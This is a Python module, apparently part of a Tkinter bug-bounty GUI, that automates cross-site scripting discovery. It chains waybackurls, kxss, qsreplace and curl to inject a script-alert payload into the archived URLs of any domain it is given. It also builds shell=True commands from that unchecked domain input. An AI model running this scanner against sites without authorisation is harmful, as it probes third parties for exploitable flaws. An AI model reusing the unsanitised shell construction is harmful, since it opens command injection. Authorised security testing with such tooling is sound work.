import subprocess
import re
from tkinter import messagebox


# ANSI renk kodlarını temizleyen fonksiyon
def clean_output(text):
    """
    ANSI renk kodlarını, gereksiz sembolleri ve boşlukları temizler.
    """
    ansi_escape = re.compile(r'(?:\x1B[@-_]|[\x80-\x9F][@-_])[0-?]*[ -/]*[@-~]')
    cleaned_text = ansi_escape.sub('', text)
    cleaned_text = re.sub(r'\n+', '\n', cleaned_text)
    cleaned_text = cleaned_text.strip()
    return cleaned_text


# XSS tarama modülü
def run_xss_scan(domain, output_widget):
    """
    XSS tarama modülü. Hem `waybackurls | kxss` hem de `qsreplace | curl` çalıştırır.
    Sonuçları 'xss_kxss.txt' ve 'xss_qsreplace.txt' dosyalarına kaydeder.
    """
    try:
        # 1. KXSS taraması
        kxss_command = f"echo http://{domain}/ | waybackurls | kxss > xss_kxss.txt"
        output_widget.insert("end", f"Running KXSS Scan: {kxss_command}\n")
        output_widget.yview("end")

        kxss_process = subprocess.Popen(kxss_command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for line in iter(kxss_process.stdout.readline, ''):
            if not line:
                break
            clean_line = clean_output(line)
            output_widget.insert("end", clean_line + "\n")
            output_widget.yview("end")

        kxss_process.wait()
        output_widget.insert("end", "KXSS Scan completed! Results saved to 'xss_kxss.txt'.\n")
        output_widget.yview("end")

        # 2. qsreplace + curl taraması
        qsreplace_command = (
            f"waybackurls {domain} | grep '=' | qsreplace '\"><script>alert(1)</script>' | "
            f"while read host; do curl -s --path-as-is --insecure \"$host\" | grep -qs '<script>alert(1)</script>' "
            f"&& echo \"$host Vulnerable\"; done > xss_qsreplace.txt"
        )
        output_widget.insert("end", f"Running QSReplace + CURL Scan: {qsreplace_command}\n")
        output_widget.yview("end")

        qsreplace_process = subprocess.Popen(qsreplace_command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for line in iter(qsreplace_process.stdout.readline, ''):
            if not line:
                break
            clean_line = clean_output(line)
            output_widget.insert("end", clean_line + "\n")
            output_widget.yview("end")

        qsreplace_process.wait()
        output_widget.insert("end", "QSReplace + CURL Scan completed! Results saved to 'xss_qsreplace.txt'.\n")
        output_widget.yview("end")

    except Exception as e:
        # Hata durumunda mesaj kutusu göster
        output_widget.insert("end", f"An error occurred during the XSS scan: {e}\n")
        output_widget.yview("end")
        messagebox.showerror("Error", "An error occurred during the XSS scan.")

